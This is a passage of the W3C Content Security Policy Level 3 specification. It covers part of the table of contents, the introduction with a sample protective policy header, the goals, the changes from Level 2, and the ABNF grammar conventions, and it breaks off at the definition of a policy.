     <ol class="toc">
      <li>
       <a href="#fetch-integration"><span class="secno">4.1</span> <span class="content"> Integration with Fetch </span></a>
       <ol class="toc">
        <li><a href="#set-response-csp-list"><span class="secno">4.1.1</span> <span class="content"> Set <var>response</var>’s CSP list </span></a>
        <li><a href="#report-for-request"><span class="secno">4.1.2</span> <span class="content"> Report Content Security Policy violations for <var>request</var> </span></a>
        <li><a href="#should-block-request"><span class="secno">4.1.3</span> <span class="content"> Should <var>request</var> be blocked by Content Security Policy? </span></a>
        <li><a href="#should-block-response"><span class="secno">4.1.4</span> <span class="content"> Should <var>response</var> to <var>request</var> be blocked by Content Security Policy? </span></a>
       </ol>
      <li>
       <a href="#html-integration"><span class="secno">4.2</span> <span class="content"> Integration with HTML </span></a>
       <ol class="toc">
        <li><a href="#initialize-document-csp"><span class="secno">4.2.1</span> <span class="content"> Initialize a <code>Document</code>’s <code>CSP list</code> </span></a>
        <li><a href="#initialize-global-object-csp"><span class="secno">4.2.2</span> <span class="content"> Initialize a global object’s <code>CSP list</code> </span></a>
        <li><a href="#get-csp-of-object"><span class="secno">4.2.3</span> <span class="content"> Retrieve the <span>CSP list</span> of an <var>object</var> </span></a>
        <li><a href="#should-block-inline"><span class="secno">4.2.4</span> <span class="content"> Should <var>element</var>’s inline <var>type</var> behavior be blocked by Content Security Policy? </span></a>
        <li><a href="#should-block-navigation-request"><span class="secno">4.2.5</span> <span class="content"> Should <var>navigation request</var> of <var>type</var> be blocked
    by Content Security Policy? </span></a>
        <li><a href="#should-block-navigation-response"><span class="secno">4.2.6</span> <span class="content"> Should <var>navigation response</var> to <var>navigation request</var> of <var>type</var> in <var>target</var> be blocked by Content Security Policy? </span></a>
       </ol>
      <li>
       <a href="#ecma-integration"><span class="secno">4.3</span> <span class="content">Integration with ECMAScript</span></a>
       <ol class="toc">
        <li><a href="#can-compile-strings"><span class="secno">4.3.1</span> <span class="content"> EnsureCSPDoesNotBlockStringCompilation(<var>callerRealm</var>, <var>calleeRealm</var>, <var>source</var>) </span></a>
       </ol>
     </ol>
    <li>
     <a href="#reporting"><span class="secno">5</span> <span class="content"> Reporting </span></a>
     <ol class="toc">
      <li><a href="#violation-events"><span class="secno">5.1</span> <span class="content"> Violation DOM Events </span></a>
      <li><a href="#deprecated-serialize-violation"><span class="secno">5.2</span> <span class="content"> Obtain the deprecated serialization of <var>violation</var> </span></a>
      <li><a href="#report-violation"><span class="secno">5.3</span> <span class="content"> Report a <var>violation</var> </span></a>
     </ol>
    <li>
     <a href="#csp-directives"><span class="secno">6</span> <span class="content"> Content Security Policy Directives </span></a>
     <ol class="toc">
      <li>
       <a href="#directives-fetch"><span class="secno">6.1</span> <span class="content"> Fetch Directives </span></a>
       <ol class="toc">
        <li>
         <a href="#directive-child-src"><span class="secno">6.1.1</span> <span class="content"><code>child-src</code></span></a>
         <ol class="toc">
          <li><a href="#child-src-pre-request"><span class="secno">6.1.1.1</span> <span class="content"> <code>child-src</code> Pre-request check </span></a>
          <li><a href="#child-src-post-request"><span class="secno">6.1.1.2</span> <span class="content"> <code>child-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-connect-src"><span class="secno">6.1.2</span> <span class="content"><code>connect-src</code></span></a>
         <ol class="toc">
          <li><a href="#connect-src-pre-request"><span class="secno">6.1.2.1</span> <span class="content"> <code>connect-src</code> Pre-request check </span></a>
          <li><a href="#connect-src-post-request"><span class="secno">6.1.2.2</span> <span class="content"> <code>connect-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-default-src"><span class="secno">6.1.3</span> <span class="content"><code>default-src</code></span></a>
         <ol class="toc">
          <li><a href="#default-src-pre-request"><span class="secno">6.1.3.1</span> <span class="content"> <code>default-src</code> Pre-request check </span></a>
          <li><a href="#default-src-post-request"><span class="secno">6.1.3.2</span> <span class="content"> <code>default-src</code> Post-request check </span></a>
          <li><a href="#default-src-inline"><span class="secno">6.1.3.3</span> <span class="content"> <code>default-src</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-font-src"><span class="secno">6.1.4</span> <span class="content"><code>font-src</code></span></a>
         <ol class="toc">
          <li><a href="#font-src-pre-request"><span class="secno">6.1.4.1</span> <span class="content"> <code>font-src</code> Pre-request check </span></a>
          <li><a href="#font-src-post-request"><span class="secno">6.1.4.2</span> <span class="content"> <code>font-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-frame-src"><span class="secno">6.1.5</span> <span class="content"><code>frame-src</code></span></a>
         <ol class="toc">
          <li><a href="#frame-src-pre-request"><span class="secno">6.1.5.1</span> <span class="content"> <code>frame-src</code> Pre-request check </span></a>
          <li><a href="#frame-src-post-request"><span class="secno">6.1.5.2</span> <span class="content"> <code>frame-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-img-src"><span class="secno">6.1.6</span> <span class="content"><code>img-src</code></span></a>
         <ol class="toc">
          <li><a href="#img-src-pre-request"><span class="secno">6.1.6.1</span> <span class="content"> <code>img-src</code> Pre-request check </span></a>
          <li><a href="#img-src-post-request"><span class="secno">6.1.6.2</span> <span class="content"> <code>img-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-manifest-src"><span class="secno">6.1.7</span> <span class="content"><code>manifest-src</code></span></a>
         <ol class="toc">
          <li><a href="#manifest-src-pre-request"><span class="secno">6.1.7.1</span> <span class="content"> <code>manifest-src</code> Pre-request check </span></a>
          <li><a href="#manifest-src-post-request"><span class="secno">6.1.7.2</span> <span class="content"> <code>manifest-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-media-src"><span class="secno">6.1.8</span> <span class="content"><code>media-src</code></span></a>
         <ol class="toc">
          <li><a href="#media-src-pre-request"><span class="secno">6.1.8.1</span> <span class="content"> <code>media-src</code> Pre-request check </span></a>
          <li><a href="#media-src-post-request"><span class="secno">6.1.8.2</span> <span class="content"> <code>media-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-object-src"><span class="secno">6.1.9</span> <span class="content"><code>object-src</code></span></a>
         <ol class="toc">
          <li><a href="#object-src-pre-request"><span class="secno">6.1.9.1</span> <span class="content"> <code>object-src</code> Pre-request check </span></a>
          <li><a href="#object-src-post-request"><span class="secno">6.1.9.2</span> <span class="content"> <code>object-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-prefetch-src"><span class="secno">6.1.10</span> <span class="content"><code>prefetch-src</code></span></a>
         <ol class="toc">
          <li><a href="#prefetch-src-pre-request"><span class="secno">6.1.10.1</span> <span class="content"> <code>prefetch-src</code> Pre-request check </span></a>
          <li><a href="#prefetch-src-post-request"><span class="secno">6.1.10.2</span> <span class="content"> <code>prefetch-src</code> Post-request check </span></a>
         </ol>
        <li>
         <a href="#directive-script-src"><span class="secno">6.1.11</span> <span class="content"><code>script-src</code></span></a>
         <ol class="toc">
          <li><a href="#script-src-pre-request"><span class="secno">6.1.11.1</span> <span class="content"> <code>script-src</code> Pre-request check </span></a>
          <li><a href="#script-src-post-request"><span class="secno">6.1.11.2</span> <span class="content"> <code>script-src</code> Post-request check </span></a>
          <li><a href="#script-src-inline"><span class="secno">6.1.11.3</span> <span class="content"> <code>script-src</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-script-src-elem"><span class="secno">6.1.12</span> <span class="content"><code>script-src-elem</code></span></a>
         <ol class="toc">
          <li><a href="#script-src-elem-pre-request"><span class="secno">6.1.12.1</span> <span class="content"> <code>script-src-elem</code> Pre-request check </span></a>
          <li><a href="#script-src-elem-post-request"><span class="secno">6.1.12.2</span> <span class="content"> <code>script-src-elem</code> Post-request check </span></a>
          <li><a href="#script-src-elem-inline"><span class="secno">6.1.12.3</span> <span class="content"> <code>script-src-elem</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-script-src-attr"><span class="secno">6.1.13</span> <span class="content"><code>script-src-attr</code></span></a>
         <ol class="toc">
          <li><a href="#script-src-attr-inline"><span class="secno">6.1.13.1</span> <span class="content"> <code>script-src-attr</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-style-src"><span class="secno">6.1.14</span> <span class="content"><code>style-src</code></span></a>
         <ol class="toc">
          <li><a href="#style-src-pre-request"><span class="secno">6.1.14.1</span> <span class="content"> <code>style-src</code> Pre-request Check </span></a>
          <li><a href="#style-src-post-request"><span class="secno">6.1.14.2</span> <span class="content"> <code>style-src</code> Post-request Check </span></a>
          <li><a href="#style-src-inline"><span class="secno">6.1.14.3</span> <span class="content"> <code>style-src</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-style-src-elem"><span class="secno">6.1.15</span> <span class="content"><code>style-src-elem</code></span></a>
         <ol class="toc">
          <li><a href="#style-src-elem-pre-request"><span class="secno">6.1.15.1</span> <span class="content"> <code>style-src-elem</code> Pre-request Check </span></a>
          <li><a href="#style-src-elem-post-request"><span class="secno">6.1.15.2</span> <span class="content"> <code>style-src-elem</code> Post-request Check </span></a>
          <li><a href="#style-src-elem-inline"><span class="secno">6.1.15.3</span> <span class="content"> <code>style-src-elem</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-style-src-attr"><span class="secno">6.1.16</span> <span class="content"><code>style-src-attr</code></span></a>
         <ol class="toc">
          <li><a href="#style-src-attr-inline"><span class="secno">6.1.16.1</span> <span class="content"> <code>style-src-attr</code> Inline Check </span></a>
         </ol>
        <li>
         <a href="#directive-worker-src"><span class="secno">6.1.17</span> <span class="content"><code>worker-src</code></span></a>
         <ol class="toc">
          <li><a href="#worker-src-pre-request"><span class="secno">6.1.17.1</span> <span class="content"> <code>worker-src</code> Pre-request Check </span></a>
          <li><a href="#worker-src-post-request"><span class="secno">6.1.17.2</span> <span class="content"> <code>worker-src</code> Post-request Check </span></a>
         </ol>
       </ol>
      <li>
       <a href="#directives-document"><span class="secno">6.2</span> <span class="content"> Document Directives </span></a>
       <ol class="toc">
        <li>
         <a href="#directive-base-uri"><span class="secno">6.2.1</span> <span class="content"><code>base-uri</code></span></a>
         <ol class="toc">
          <li><a href="#allow-base-for-document"><span class="secno">6.2.1.1</span> <span class="content"> Is <var>base</var> allowed for <var>document</var>? </span></a>
         </ol>
        <li>
         <a href="#directive-sandbox"><span class="secno">6.2.2</span> <span class="content"><code>sandbox</code></span></a>
         <ol class="toc">
          <li><a href="#sandbox-response"><span class="secno">6.2.2.1</span> <span class="content"> <code>sandbox</code> Response Check </span></a>
          <li><a href="#sandbox-init"><span class="secno">6.2.2.2</span> <span class="content"> <code>sandbox</code> Initialization </span></a>
         </ol>
       </ol>
      <li>
       <a href="#directives-navigation"><span class="secno">6.3</span> <span class="content"> Navigation Directives </span></a>
       <ol class="toc">
        <li>
         <a href="#directive-form-action"><span class="secno">6.3.1</span> <span class="content"><code>form-action</code></span></a>
         <ol class="toc">
          <li><a href="#form-action-pre-navigate"><span class="secno">6.3.1.1</span> <span class="content"> <code>form-action</code> Pre-Navigation Check </span></a>
         </ol>
        <li>
         <a href="#directive-frame-ancestors"><span class="secno">6.3.2</span> <span class="content"><code>frame-ancestors</code></span></a>
         <ol class="toc">
          <li><a href="#frame-ancestors-navigation-response"><span class="secno">6.3.2.1</span> <span class="content"> <code>frame-ancestors</code> Navigation Response Check </span></a>
          <li><a href="#frame-ancestors-and-frame-options"><span class="secno">6.3.2.2</span> <span class="content"> Relation to <code>X-Frame-Options</code> </span></a>
         </ol>
        <li>
         <a href="#directive-navigate-to"><span class="secno">6.3.3</span> <span class="content"><code>navigate-to</code></span></a>
         <ol class="toc">
          <li><a href="#navigate-to-pre-navigate"><span class="secno">6.3.3.1</span> <span class="content"> <code>navigate-to</code> Pre-Navigation Check </span></a>
          <li><a href="#navigate-to-navigation-response"><span class="secno">6.3.3.2</span> <span class="content"> <code>navigate-to</code> Navigation Response Check </span></a>
         </ol>
       </ol>
      <li>
       <a href="#directives-reporting"><span class="secno">6.4</span> <span class="content"> Reporting Directives </span></a>
       <ol class="toc">
        <li><a href="#directive-report-uri"><span class="secno">6.4.1</span> <span class="content"><code>report-uri</code></span></a>
        <li><a href="#directive-report-to"><span class="secno">6.4.2</span> <span class="content"><code>report-to</code></span></a>
       </ol>
      <li><a href="#directives-elsewhere"><span class="secno">6.5</span> <span class="content"> Directives Defined in Other Documents </span></a>
      <li>
       <a href="#matching-algorithms"><span class="secno">6.6</span> <span class="content">Matching Algorithms</span></a>
       <ol class="toc">
        <li>
         <a href="#script-checks"><span class="secno">6.6.1</span> <span class="content">Script directive checks</span></a>
         <ol class="toc">
          <li><a href="#script-pre-request"><span class="secno">6.6.1.1</span> <span class="content"> Script directives pre-request check </span></a>
          <li><a href="#script-post-request"><span class="secno">6.6.1.2</span> <span class="content"> Script directives post-request check </span></a>
         </ol>
        <li>
         <a href="#matching-urls"><span class="secno">6.6.2</span> <span class="content">URL Matching</span></a>
         <ol class="toc">
          <li><a href="#does-request-violate-policy"><span class="secno">6.6.2.1</span> <span class="content"> Does <var>request</var> violate <var>policy</var>? </span></a>
          <li><a href="#match-nonce-to-source-list"><span class="secno">6.6.2.2</span> <span class="content"> Does <var>nonce</var> match <var>source list</var>? </span></a>
          <li><a href="#match-request-to-source-list"><span class="secno">6.6.2.3</span> <span class="content"> Does <var>request</var> match <var>source list</var>? </span></a>
          <li><a href="#match-response-to-source-list"><span class="secno">6.6.2.4</span> <span class="content"> Does <var>response</var> to <var>request</var> match <var>source list</var>? </span></a>
          <li><a href="#match-url-to-source-list"><span class="secno">6.6.2.5</span> <span class="content"> Does <var>url</var> match <var>source list</var> in <var>origin</var> with <var>redirect count</var>? </span></a>
          <li><a href="#match-url-to-source-expression"><span class="secno">6.6.2.6</span> <span class="content"> Does <var>url</var> match <var>expression</var> in <var>origin</var> with <var>redirect count</var>? </span></a>
          <li><a href="#match-schemes"><span class="secno">6.6.2.7</span> <span class="content"> <code>scheme-part</code> matching </span></a>
          <li><a href="#match-hosts"><span class="secno">6.6.2.8</span> <span class="content"> <code>host-part</code> matching </span></a>
          <li><a href="#match-ports"><span class="secno">6.6.2.9</span> <span class="content"> <code>port-part</code> matching </span></a>
          <li><a href="#match-paths"><span class="secno">6.6.2.10</span> <span class="content"> <code>path-part</code> matching </span></a>
         </ol>
        <li>
         <a href="#matching-elements"><span class="secno">6.6.3</span> <span class="content">Element Matching Algorithms</span></a>
         <ol class="toc">
          <li><a href="#is-element-nonceable"><span class="secno">6.6.3.1</span> <span class="content"> Is <var>element</var> nonceable? </span></a>
          <li><a href="#allow-all-inline"><span class="secno">6.6.3.2</span> <span class="content"> Does a source list allow all inline behavior for <var>type</var>? </span></a>
          <li><a href="#match-element-to-source-list"><span class="secno">6.6.3.3</span> <span class="content"> Does <var>element</var> match source list for <var>type</var> and <var>source</var>? </span></a>
         </ol>
       </ol>
      <li>
       <a href="#directive-algorithms"><span class="secno">6.7</span> <span class="content">Directive Algorithms</span></a>
       <ol class="toc">
        <li><a href="#effective-directive-for-a-request"><span class="secno">6.7.1</span> <span class="content"> Get the effective directive for <var>request</var> </span></a>
        <li><a href="#effective-directive-for-inline-check"><span class="secno">6.7.2</span> <span class="content"> Get the effective directive for inline checks </span></a>
        <li><a href="#directive-fallback-list"><span class="secno">6.7.3</span> <span class="content"> Get fetch directive fallback list </span></a>
        <li><a href="#should-directive-execute"><span class="secno">6.7.4</span> <span class="content"> Should fetch directive execute </span></a>
       </ol>
     </ol>
    <li>
     <a href="#security-considerations"><span class="secno">7</span> <span class="content">Security and Privacy Considerations</span></a>
     <ol class="toc">
      <li><a href="#security-nonces"><span class="secno">7.1</span> <span class="content">Nonce Reuse</span></a>
      <li>
       <a href="#security-nonce-hijacking"><span class="secno">7.2</span> <span class="content">Nonce Hijacking</span></a>
       <ol class="toc">
        <li><a href="#dangling-markup-attacks"><span class="secno">7.2.1</span> <span class="content">Dangling markup attacks</span></a>
        <li><a href="#nonce-exfiltration-content-attributes"><span class="secno">7.2.2</span> <span class="content">Nonce exfiltration via content attributes</span></a>
       </ol>
      <li><a href="#security-nonce-retargeting"><span class="secno">7.3</span> <span class="content">Nonce Retargeting</span></a>
      <li><a href="#security-css-parsing"><span class="secno">7.4</span> <span class="content">CSS Parsing</span></a>
      <li><a href="#security-violation-reports"><span class="secno">7.5</span> <span class="content">Violation Reports</span></a>
      <li><a href="#source-list-paths-and-redirects"><span class="secno">7.6</span> <span class="content">Paths and Redirects</span></a>
      <li><a href="#security-secure-upgrades"><span class="secno">7.7</span> <span class="content">Secure Upgrades</span></a>
      <li><a href="#security-inherit-csp"><span class="secno">7.8</span> <span class="content"> CSP Inheriting to avoid bypasses </span></a>
     </ol>
    <li>
     <a href="#authoring-considerations"><span class="secno">8</span> <span class="content">Authoring Considerations</span></a>
     <ol class="toc">
      <li><a href="#multiple-policies"><span class="secno">8.1</span> <span class="content"> The effect of multiple policies </span></a>
      <li><a href="#strict-dynamic-usage"><span class="secno">8.2</span> <span class="content"> Usage of "<code>'strict-dynamic'</code>" </span></a>
      <li><a href="#unsafe-hashes-usage"><span class="secno">8.3</span> <span class="content"> Usage of "<code>'unsafe-hashes'</code>" </span></a>
      <li><a href="#external-hash"><span class="secno">8.4</span> <span class="content"> Allowing external JavaScript via hashes </span></a>
     </ol>
    <li>
     <a href="#implementation-considerations"><span class="secno">9</span> <span class="content">Implementation Considerations</span></a>
     <ol class="toc">
      <li><a href="#extensions"><span class="secno">9.1</span> <span class="content">Vendor-specific Extensions and Addons</span></a>
     </ol>
    <li>
     <a href="#iana-considerations"><span class="secno">10</span> <span class="content">IANA Considerations</span></a>
     <ol class="toc">
      <li><a href="#iana-registry"><span class="secno">10.1</span> <span class="content"> Directive Registry </span></a>
      <li>
       <a href="#iana-headers"><span class="secno">10.2</span> <span class="content"> Headers </span></a>
       <ol class="toc">
        <li><a href="#iana-csp"><span class="secno">10.2.1</span> <span class="content">Content-Security-Policy</span></a>
        <li><a href="#iana-cspro"><span class="secno">10.2.2</span> <span class="content">Content-Security-Policy-Report-Only</span></a>
       </ol>
     </ol>
    <li><a href="#acknowledgements"><span class="secno">11</span> <span class="content">Acknowledgements</span></a>
    <li>
     <a href="#w3c-conformance"><span class="secno"></span> <span class="content">Conformance</span></a>
     <ol class="toc">
      <li><a href="#w3c-conventions"><span class="secno"></span> <span class="content">Document conventions</span></a>
      <li><a href="#w3c-conformant-algorithms"><span class="secno"></span> <span class="content">Conformant Algorithms</span></a>
     </ol>
    <li>
     <a href="#index"><span class="secno"></span> <span class="content">Index</span></a>
     <ol class="toc">
      <li><a href="#index-defined-here"><span class="secno"></span> <span class="content">Terms defined by this specification</span></a>
      <li><a href="#index-defined-elsewhere"><span class="secno"></span> <span class="content">Terms defined by reference</span></a>
     </ol>
    <li>
     <a href="#references"><span class="secno"></span> <span class="content">References</span></a>
     <ol class="toc">
      <li><a href="#normative"><span class="secno"></span> <span class="content">Normative References</span></a>
      <li><a href="#informative"><span class="secno"></span> <span class="content">Informative References</span></a>
     </ol>
    <li><a href="#idl-index"><span class="secno"></span> <span class="content">IDL Index</span></a>
    <li><a href="#issues-index"><span class="secno"></span> <span class="content">Issues Index</span></a>
   </ol>
  </nav>
  <main>
   <section>
    <h2 class="heading settled" data-level="1" id="intro"><span class="secno">1. </span><span class="content">Introduction</span><a class="self-link" href="#intro"></a></h2>
    <p><em>This section is not normative.</em></p>
    <p>This document defines <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="content-security-policy">Content Security Policy</dfn> (CSP), a tool
  which developers can use to lock down their applications in various ways,
  mitigating the risk of content injection vulnerabilities such as cross-site scripting, and
  reducing the privilege with which their applications execute.</p>
    <p>CSP is not intended as a first line of defense against content injection
  vulnerabilities. Instead, CSP is best used as defense-in-depth. It reduces
  the harm that a malicious injection can cause, but it is not a replacement for
  careful input validation and output encoding.</p>
    <p>This document is an iteration on Content Security Policy Level 2, with the
  goal of more clearly explaining the interactions between CSP, HTML, and Fetch
  on the one hand, and providing clear hooks for modular extensibility on the
  other. Ideally, this will form a stable core upon which we can build new
  functionality.</p>
    <h3 class="heading settled" data-level="1.1" id="examples"><span class="secno">1.1. </span><span class="content">Examples</span><a class="self-link" href="#examples"></a></h3>
    <h4 class="heading settled" data-level="1.1.1" id="example-basic"><span class="secno">1.1.1. </span><span class="content">Control Execution</span><a class="self-link" href="#example-basic"></a></h4>
    <div class="example" id="example-1a2032b4">
     <a class="self-link" href="#example-1a2032b4"></a> MegaCorp Inc’s developers want to protect themselves against cross-site
    scripting attacks. They can mitigate the risk of script injection by
    ensuring that their trusted CDN is the only origin from which script can
    load and execute. Moreover, they wish to ensure that no plugins can
    execute in their pages' contexts. The following policy has that effect: 
<pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy">Content-Security-Policy</a>: script-src https://cdn.example.com/scripts/; object-src 'none'
</pre>
    </div>
    <h3 class="heading settled" data-level="1.2" id="goals"><span class="secno">1.2. </span><span class="content">Goals</span><a class="self-link" href="#goals"></a></h3>
    <p>Content Security Policy aims to do to a few related things:</p>
    <ol>
     <li data-md>
      <p>Mitigate the risk of content-injection attacks by giving developers
  fairly granular control over</p>
      <ul>
       <li data-md>
        <p>The resources which can be requested (and subsequently embedded or
  executed) on behalf of a specific <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document">Document</a></code> or <code class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker">Worker</a></code></p>
       <li data-md>
        <p>The execution of inline script</p>
       <li data-md>
        <p>Dynamic code execution (via <code class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-eval-x" id="ref-for-sec-eval-x">eval()</a></code> and similar constructs)</p>
       <li data-md>
        <p>The application of inline style</p>
      </ul>
     <li data-md>
      <p>Mitigate the risk of attacks which require a resource to be embedded
  in a malicious context (the "Pixel Perfect" attack described in <a data-link-type="biblio" href="#biblio-timing" title="Pixel Perfect Timing Attacks with HTML5">[TIMING]</a>, for example) by giving developers granular control over the
  origins which can embed a given resource.</p>
     <li data-md>
      <p>Provide a policy framework which allows developers to reduce the privilege
  of their applications.</p>
     <li data-md>
      <p>Provide a reporting mechanism which allows developers to detect flaws
  being exploited in the wild.</p>
    </ol>
    <h3 class="heading settled" data-level="1.3" id="changes-from-level-2"><span class="secno">1.3. </span><span class="content">Changes from Level 2</span><a class="self-link" href="#changes-from-level-2"></a></h3>
    <p>This document describes an evolution of the Content Security Policy Level 2
  specification <a data-link-type="biblio" href="#biblio-csp2" title="Content Security Policy Level 2">[CSP2]</a>. The following is a high-level overview of the changes:</p>
    <ol>
     <li data-md>
      <p>The specification has been rewritten from the ground up in terms of the <a data-link-type="biblio" href="#biblio-fetch" title="Fetch Standard">[FETCH]</a> specification, which should make it simpler to integrate CSP’s
  requirements and restrictions with other specifications (and with
  Service Workers in particular).</p>
     <li data-md>
      <p>The <code>child-src</code> model has been substantially altered:</p>
      <ol>
       <li data-md>
        <p>The <code>frame-src</code> directive, which was deprecated in CSP Level
 2, has been undeprecated, but continues to defer to <code>child-src</code> if
 not present (which defers to <code>default-src</code> in turn).</p>
       <li data-md>
        <p>A <code>worker-src</code> directive has been added, deferring to <code>child-src</code> if not present (which likewise defers to <code>script-src</code> and
 eventually <code>default-src</code>).</p>
       <li data-md>
        <p>Dedicated workers now always inherit their creator’s policy.</p>
      </ol>
     <li data-md>
      <p>The URL matching algorithm now treats insecure schemes and ports as
  matching their secure variants. That is, the source expression <code>http://example.com:80</code> will match both <code>http://example.com:80</code> and <code>https://example.com:443</code>.</p>
      <p>Likewise, <code>'self'</code> now matches <code>https:</code> and <code>wss:</code> variants of the page’s
  origin, even on pages whose scheme is <code>http</code>.</p>
     <li data-md>
      <p>Violation reports generated from inline script or style will now report
  "<code>inline</code>" as the blocked resource. Likewise, blocked <code>eval()</code> execution
  will report "<code>eval</code>" as the blocked resource.</p>
     <li data-md>
      <p>The <code>manifest-src</code> directive has been added.</p>
     <li data-md>
      <p>The <code>report-uri</code> directive is deprecated in favor of the new <code>report-to</code> directive, which relies on <a data-link-type="biblio" href="#biblio-reporting" title="Reporting API">[REPORTING]</a> as infrastructure.</p>
     <li data-md>
      <p>The <code>'strict-dynamic'</code> source expression will now allow script which
  executes on a page to load more script via non-<a data-link-type="dfn" href="https://html.spec.whatwg.org/#parser-inserted" id="ref-for-parser-inserted">"parser-inserted"</a> <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script">script</a></code> elements. Details are in <a href="#strict-dynamic-usage">§ 8.2 Usage of "'strict-dynamic'"</a>.</p>
     <li data-md>
      <p>The <code>'unsafe-hashes'</code> source expression will now allow event
  handlers, style attributes and <code>javascript:</code> navigation targets to match
  hashes. Details in <a href="#unsafe-hashes-usage">§ 8.3 Usage of "'unsafe-hashes'"</a>.</p>
     <li data-md>
      <p>The <a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression">source expression</a> matching has been changed to require explicit presence
  of any non-<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme">HTTP(S) scheme</a>, rather than <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme">local scheme</a>,
  unless that non-<a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme" id="ref-for-http-scheme①">HTTP(S) scheme</a> is the same as the scheme of protected resource,
  as described in <a href="#match-url-to-source-expression">§ 6.6.2.6 Does url match expression in origin with redirect count?</a>.</p>
     <li data-md>
      <p>Hash-based source expressions may now match external scripts if the <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①">script</a></code> element that triggers the request specifies a set of integrity
  metadata which is listed in the current policy. Details in <a href="#external-hash">§ 8.4 Allowing external JavaScript via hashes</a>.</p>
     <li data-md>
      <p>The <a data-link-type="dfn" href="#navigate-to" id="ref-for-navigate-to"><code>navigate-to</code></a> directive gives a resource control over the endpoints
  to which it can initiate navigation.</p>
     <li data-md>
      <p>Reports generated for inline violations will contain a <a data-link-type="dfn" href="#violation-sample" id="ref-for-violation-sample">sample</a> attribute if the relevant directive contains the <a data-link-type="grammar" href="#grammardef-report-sample" id="ref-for-grammardef-report-sample"><code>'report-sample'</code></a> expression.</p>
    </ol>
   </section>
   <section>
    <h2 class="heading settled" data-level="2" id="framework"><span class="secno">2. </span><span class="content">Framework</span><a class="self-link" href="#framework"></a></h2>
    <h3 class="heading settled" data-level="2.1" id="framework-infrastructure"><span class="secno">2.1. </span><span class="content">Infrastructure</span><a class="self-link" href="#framework-infrastructure"></a></h3>
    <p>This document uses ABNF grammar to specify syntax, as defined in <a data-link-type="biblio" href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>. It also relies on
  the <code>#rule</code> ABNF extension defined in <a href="https://tools.ietf.org/html/rfc7230#section-7">Section 7</a> of <a data-link-type="biblio" href="#biblio-rfc7230" title="HTTP/1.1">[RFC7230]</a>,
  with the modification that <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc7230#section-3.2.3" id="ref-for-section-3.2.3">OWS</a> is replaced with <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace">optional-ascii-whitespace</a>. That is, the <code>#rule</code> used in this
  document is defined as:</p>
<pre>1#element => element *( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace①">optional-ascii-whitespace</a> "," <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace②">optional-ascii-whitespace</a> element )
</pre>
    <p>and for n >= 1 and m > 1:</p>
<pre>&lt;n>#&lt;m>element => element &lt;n-1>*&lt;m-1>( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace③">optional-ascii-whitespace</a> "," <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace④">optional-ascii-whitespace</a> element )
</pre>
    <p>This document depends on the Infra Standard for a number of foundational concepts used in its
  algorithms and prose <a data-link-type="biblio" href="#biblio-infra" title="Infra Standard">[INFRA]</a>.</p>
    <p>The following definitions are used to improve readability of other definitions in this document.</p>
<pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-optional-ascii-whitespace">optional-ascii-whitespace</dfn> = *( %x09 / %x0A / %x0C / %x0D / %x20 )
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-required-ascii-whitespace">required-ascii-whitespace</dfn> = 1*( %x09 / %x0A / %x0C / %x0D / %x20 )
; These productions match the definition of <a data-link-type="grammar" href="https://infra.spec.whatwg.org/#ascii-whitespace" id="ref-for-ascii-whitespace">ASCII whitespace</a> from the <a data-link-type="grammar" href="https://infra.spec.whatwg.org/#" id="ref-for-something">INFRA</a> standard.
</pre>
    <h3 class="heading settled" data-level="2.2" id="framework-policy"><span class="secno">2.2. </span><span class="content">Policies</span><a class="self-link" href="#framework-policy"></a></h3>
    <p>A <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-local-lt="policy" data-lt="content security policy object" id="content-security-policy-object">policy</dfn> defines allowed
